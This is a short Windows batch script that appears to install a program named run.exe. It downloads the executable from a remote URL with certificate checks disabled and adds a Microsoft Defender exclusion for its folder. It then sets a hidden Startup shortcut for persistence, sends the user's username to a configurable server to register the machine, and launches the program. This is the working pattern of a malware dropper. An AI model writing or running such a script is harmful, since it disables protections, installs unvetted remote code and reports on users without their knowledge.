@echo off
setlocal enabledelayedexpansion

set "BASE_URL="
set "API_KEY="

set "installDir=%APPDATA%\run"
set "runExe=%installDir%\run.exe"
set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk"
set "datFile=%APPDATA%\run.dat"

taskkill /f /im run.exe >nul 2>nul
if exist "%datFile%" del "%datFile%"
if exist "%runExe%" del "%runExe%"

mkdir "%installDir%" 2>nul

curl -k -L -o "%runExe%" "https://github.com/yuan-miranda/run/raw/main/run.exe"
if !ERRORLEVEL! NEQ 0 (
  exit /b
)

powershell -Command "Add-MpPreference -ExclusionPath '%installDir%'" 2>nul
powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%shortcutPath%'); $Shortcut.TargetPath = '%runExe%'; $Shortcut.Arguments = '--startup'; $Shortcut.WindowStyle = 7; $Shortcut.Save()"

echo %installDir% > "%datFile%"

@REM register client
curl -s -X POST "%BASE_URL%/clients" ^
-H "apikey: !API_KEY!" ^
-H "Authorization: Bearer !API_KEY!" ^
-H "Content-Type: application/json" ^
-H "Prefer: resolution=merge-duplicates" ^
-d "{\"username\": \"!USERNAME!\"}" >nul

start "" "%runExe%" --startup